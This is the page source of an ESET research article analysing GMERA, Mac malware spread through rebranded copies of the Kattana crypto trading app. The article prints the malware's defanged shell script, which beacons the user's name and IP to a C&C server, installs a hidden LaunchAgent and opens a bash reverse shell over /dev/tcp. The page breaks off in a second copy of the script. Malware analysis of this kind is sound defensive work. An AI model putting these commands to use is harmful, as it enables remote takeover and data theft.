<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Marc-Etienne M.Léveillé',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Mac cryptocurrency trading application rebranded, bundled with malware | WeLiveSecurity</title>
<meta name="description" content="ESET researchers uncover websites distributing malicious cryptocurrency trading applications for Mac, with the malware used to steal information such as browser cookies, cryptocurrency wallets and screen captures."/>
<link rel="canonical" href="https://www.welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:locale:alternate" content="fr_FR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Mac cryptocurrency trading application rebranded, bundled with malware | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers uncover websites distributing malicious cryptocurrency trading applications for Mac, with the malware used to steal information such as browser cookies, cryptocurrency wallets and screen captures." />
<meta property="og:url" content="https://www.welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2020-07-16T09:30:50+00:00" />
<meta property="article:modified_time" content="2020-08-06T08:27:16+00:00" />
<meta property="og:updated_time" content="2020-08-06T08:27:16+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/07/eset-research-mac-cryptocurrency-trading-application-malware.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2020/07/eset-research-mac-cryptocurrency-trading-application-malware.jpg" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="667" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="ESET researchers uncover websites distributing malicious cryptocurrency trading applications for Mac, with the malware used to steal information such as browser cookies, cryptocurrency wallets and screen captures." />
<meta name="twitter:title" content="Mac cryptocurrency trading application rebranded, bundled with malware | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/07/eset-research-mac-cryptocurrency-trading-application-malware.jpg" />
<meta name="twitter:creator" content="@marc_etienne_" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/br/2020/08/04/app-de-trading-de-criptomoedas-para-mac-e-usado-para-distribuir-malware/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/fr/2020/07/17/application-cryptomonnaie-mac-gmera/" hreflang="fr" />
<link rel="alternate" href="https://www.welivesecurity.com/2020/07/16/mac-cryptocurrency-trading-application-rebranded-bundled-malware/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2020/07/20/app-trading-criptomonedas-para-mac-utilizada-distribuir-malware/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2020/07/16/malware-in-krypto-trading-software-fuer-macos/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2020/08/04/app-de-trading-de-criptomoedas-para-mac-e-usado-para-distribuir-malware/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2020/07/17/application-cryptomonnaie-mac-gmera/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2020/07/20/app-trading-criptomonedas-para-mac-utilizada-distribuir-malware/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2020/07/16/malware-in-krypto-trading-software-fuer-macos/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2020/08/04/app-de-trading-de-criptomoedas-para-mac-e-usado-para-distribuir-malware/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2020/07/17/application-cryptomonnaie-mac-gmera/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2020/07/20/app-trading-criptomonedas-para-mac-utilizada-distribuir-malware/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2020/07/16/malware-in-krypto-trading-software-fuer-macos/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2020/07/Mac-cryptocurrency-trading-application-bundled-malware.jpg'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>Mac cryptocurrency trading application rebranded, bundled with malware</h1>
<div class="excerpt">ESET researchers lure GMERA malware operators to remotely control their Mac honeypots</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2013/06/Marc-Etienne-M.Leveille.png" alt="Marc-Etienne M.Léveillé">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                    Marc-Etienne M.Léveillé                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2020-07-16 11:30:50">16 Jul 2020 - 11:30AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F07%2F16%2Fmac-cryptocurrency-trading-application-rebranded-bundled-malware%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F07%2F16%2Fmac-cryptocurrency-trading-application-rebranded-bundled-malware%2F&text=Mac cryptocurrency trading application rebranded, bundled with malware%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F07%2F16%2Fmac-cryptocurrency-trading-application-rebranded-bundled-malware%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>ESET researchers lure GMERA malware operators to remotely control their Mac honeypots</p>
                            </div>

                            <p>We’ve recently discovered websites distributing malicious cryptocurrency trading applications for Mac. This malware is used to steal information such as browser cookies, cryptocurrency wallets and screen captures. Analyzing the malware samples, we quickly found that this was a new campaign of what Trend Micro researchers called GMERA, in <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/" target="_blank" rel="noopener">an analysis they published</a> in September 2019. As in the previous campaigns, the malware reports to a C&amp;C server over HTTP and connects remote terminal sessions to another C&amp;C server using a hardcoded IP address. This time, however, not only did the malware authors wrap the original, legitimate application to include malware; they also rebranded the Kattana trading application with new names and copied its original website. We have seen the following fictitious brandings used in different campaigns: <em>Cointrazer</em>, <em>Cupatrade</em>, <em>Licatrade</em> and <em>Trezarus</em>. In addition to the analysis of the malware code, ESET researchers have also set up honeypots to try to reveal the motivations behind this group of criminals.</p>
<h2>Distribution</h2>
<p>We have not yet been able to find exactly where these trojanized applications are promoted. However, in March 2020, Kattana <a href="https://twitter.com/kattanatrade/status/1238051414745722880" target="_blank" rel="noopener">posted a warning</a> suggesting that victims were approached individually to lure them into downloading a trojanized app. We couldn’t confirm that it was linked to this particular campaign, but it could very well be the case.</p>
<div id="attachment_140774" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-1.-Kattana-warns-about-trojanized-copies-of-their-software-on-Twitter.png"><img class="wp-image-140774" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-1.-Kattana-warns-about-trojanized-copies-of-their-software-on-Twitter-150x150.png" alt="" width="600" height="328" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-1.-Kattana-warns-about-trojanized-copies-of-their-software-on-Twitter-300x164.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-1.-Kattana-warns-about-trojanized-copies-of-their-software-on-Twitter-768x420.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-1.-Kattana-warns-about-trojanized-copies-of-their-software-on-Twitter-1024x560.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-1.-Kattana-warns-about-trojanized-copies-of-their-software-on-Twitter-143x79.png 143w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-1.-Kattana-warns-about-trojanized-copies-of-their-software-on-Twitter.png 1166w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 1. Kattana warns about trojanized copies of their software on Twitter</i></p></div>
<p>Copycat websites are set up to make the bogus application download look legitimate. For a person who doesn’t know Kattana, the websites do look legitimate.</p>
<p><center>
		<style type='text/css'>
			#gallery-2 {
				margin: auto;
			}
			#gallery-2 .gallery-item {
				float: left;
				margin-top: 10px;
				text-align: center;
				width: 50%;
			}
			#gallery-2 img {
				border: 2px solid #cfcfcf;
			}
			#gallery-2 .gallery-caption {
				margin-left: 0;
			}
			/* see gallery_shortcode() in wp-includes/media.php */
		</style>
		<div id='gallery-2' class='gallery galleryid-140603 gallery-columns-2 gallery-size-full'><dl class='gallery-item'>
			<dt class='gallery-icon landscape'>
				<a href='https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-2.-Original-legitimate-Kattana-website-1.png'><img width="861" height="829" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-2.-Original-legitimate-Kattana-website-1.png" class="attachment-full size-full" alt="" aria-describedby="gallery-2-140857" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-2.-Original-legitimate-Kattana-website-1.png 861w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-2.-Original-legitimate-Kattana-website-1-300x289.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-2.-Original-legitimate-Kattana-website-1-768x739.png 768w" sizes="(max-width: 861px) 100vw, 861px" /></a>
			</dt>
				<dd class='wp-caption-text gallery-caption' id='gallery-2-140857'>
				<i>Figure 2. Original (legitimate) Kattana website</i>
				</dd></dl><dl class='gallery-item'>
			<dt class='gallery-icon landscape'>
				<a href='https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-3.-Malicious-Licatrade-website-with-download-link-to-malware-1.png'><img width="861" height="829" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-3.-Malicious-Licatrade-website-with-download-link-to-malware-1.png" class="attachment-full size-full" alt="" aria-describedby="gallery-2-140858" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-3.-Malicious-Licatrade-website-with-download-link-to-malware-1.png 861w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-3.-Malicious-Licatrade-website-with-download-link-to-malware-1-300x289.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-3.-Malicious-Licatrade-website-with-download-link-to-malware-1-768x739.png 768w" sizes="(max-width: 861px) 100vw, 861px" /></a>
			</dt>
				<dd class='wp-caption-text gallery-caption' id='gallery-2-140858'>
				<i>Figure 3. Malicious Licatrade website with download link to malware</i>
				</dd></dl><br style="clear: both" />
		</div>
</center></p>
<p>The download button on the bogus sites is a link to a ZIP archive containing the trojanized application bundle.</p>
<h2>Analysis</h2>
<p>Malware analysis in this case is pretty straightforward. We will take the Licatrade sample as the example here. Other samples have minor differences, but the ideas and functionalities are essentially the same. Similar analyses of earlier GMERA campaigns are provided in Trend Micro’s <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/" target="_blank" rel="noopener">blogpost</a> and in Objective-See’s <a href="https://objective-see.com/blog/blog_0x53.html" target="_blank" rel="noopener">Mac malware of 2019</a> report.</p>
<div id="attachment_140777" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-4.-Content-of-the-Licatrade-application-bundle.png"><img class="wp-image-140777" src="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-4.-Content-of-the-Licatrade-application-bundle-150x150.png" alt="" width="600" height="594" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-4.-Content-of-the-Licatrade-application-bundle-150x150.png 150w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-4.-Content-of-the-Licatrade-application-bundle-300x297.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-4.-Content-of-the-Licatrade-application-bundle-768x760.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/07/Figure-4.-Content-of-the-Licatrade-application-bundle.png 993w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 4. Content of the Licatrade application bundle</i></p></div>
<p>Modification timestamps of the files in the ZIP archive, the date the application was signed, and the <span style="font-family: courier new, courier, monospace;">Last‑Modified</span> HTTP header when we downloaded the archive all show April 15<sup>th</sup>, 2020. This is highly suggestive that this campaign started on that date.</p>
<p>A shell script (<span style="font-family: courier new, courier, monospace;">run.sh</span>) is included in the resources of the application bundle. This main executable, written in Swift, launches <span style="font-family: courier new, courier, monospace;">run.sh</span>. For some reason, the malware author has duplicated functionality to send a simple report to a C&amp;C server over HTTP, and to connect to a remote host via TCP providing a remote shell to the attackers, in both the main executable and the shell script. An additional functionality, in the shell script only, is to set up persistence by installing a Launch Agent.</p>
<p>Here is the full shell script source (ellipsis in long string and defanged):</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-6057fb248ed31055738296" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
#! /bin/bash

function remove_spec_char(){
	echo "$1" | tr -dc '[:alnum:].\r' | tr '[:upper:]' '[:lower:]'
}

whoami="$(remove_spec_char `whoami`)"
ip="$(remove_spec_char `curl -s ipecho.net/plain`)"
req=`curl -ks "http://stepbystepby[.]com/link.php?${whoami}&amp;${ip}"`

plist_text="ZWNobyAnc2R2a21…d2Vpdm5laXZuZSc="
echo "$plist_text" | base64 --decode &gt; "/tmp/.com.apple.system.plist"
cp "/tmp/.com.apple.system.plist" "$HOME/Library/LaunchAgents/.com.apple.system.plist"
launchctl load "/tmp/.com.apple.system.plist"
scre=`screen -d -m bash -c 'bash -i &gt;/dev/tcp/193.37.212[.]97/25733 0&gt;&amp;1'`</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-6057fb248ed31055738296-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed31055738296-2">2</div><div class="crayon-num" data-line="crayon-6057fb248ed31055738296-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed31055738296-4">4</div><div class="crayon-num" data-line="crayon-6057fb248ed31055738296-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed31055738296-6">6</div><div class="crayon-num" data-line="crayon-6057fb248ed31055738296-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed31055738296-8">8</div><div class="crayon-num" data-line="crayon-6057fb248ed31055738296-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed31055738296-10">10</div><div class="crayon-num" data-line="crayon-6057fb248ed31055738296-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed31055738296-12">12</div><div class="crayon-num" data-line="crayon-6057fb248ed31055738296-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-6057fb248ed31055738296-14">14</div><div class="crayon-num" data-line="crayon-6057fb248ed31055738296-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6057fb248ed31055738296-1"><span class="crayon-p">#! /bin/bash</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed31055738296-2">&nbsp;</div><div class="crayon-line" id="crayon-6057fb248ed31055738296-3"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">remove_spec_char</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed31055738296-4"><span class="crayon-h">	</span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"$1"</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">tr</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">dc</span><span class="crayon-h"> </span><span class="crayon-s">'[:alnum:].\r'</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-i">tr</span><span class="crayon-h"> </span><span class="crayon-s">'[:upper:]'</span><span class="crayon-h"> </span><span class="crayon-s">'[:lower:]'</span></div><div class="crayon-line" id="crayon-6057fb248ed31055738296-5"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed31055738296-6">&nbsp;</div><div class="crayon-line" id="crayon-6057fb248ed31055738296-7"><span class="crayon-v">whoami</span><span class="crayon-o">=</span><span class="crayon-s">"$(remove_spec_char `whoami`)"</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed31055738296-8"><span class="crayon-v">ip</span><span class="crayon-o">=</span><span class="crayon-s">"$(remove_spec_char `curl -s ipecho.net/plain`)"</span></div><div class="crayon-line" id="crayon-6057fb248ed31055738296-9"><span class="crayon-v">req</span><span class="crayon-o">=</span><span class="crayon-sy">`</span><span class="crayon-v">curl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">ks</span><span class="crayon-h"> </span><span class="crayon-s">"http://stepbystepby[.]com/link.php?${whoami}&amp;${ip}"</span><span class="crayon-sy">`</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed31055738296-10">&nbsp;</div><div class="crayon-line" id="crayon-6057fb248ed31055738296-11"><span class="crayon-v">plist_text</span><span class="crayon-o">=</span><span class="crayon-s">"ZWNobyAnc2R2a21…d2Vpdm5laXZuZSc="</span></div><div class="crayon-line crayon-striped-line" id="crayon-6057fb248ed31055738296-12"><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">"$plist_text"</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-h"> </span><span class="crayon-v">base64</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">decode</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-s">"/tmp/.com.apple.system.plist"</span></div><div class="crayon-line" 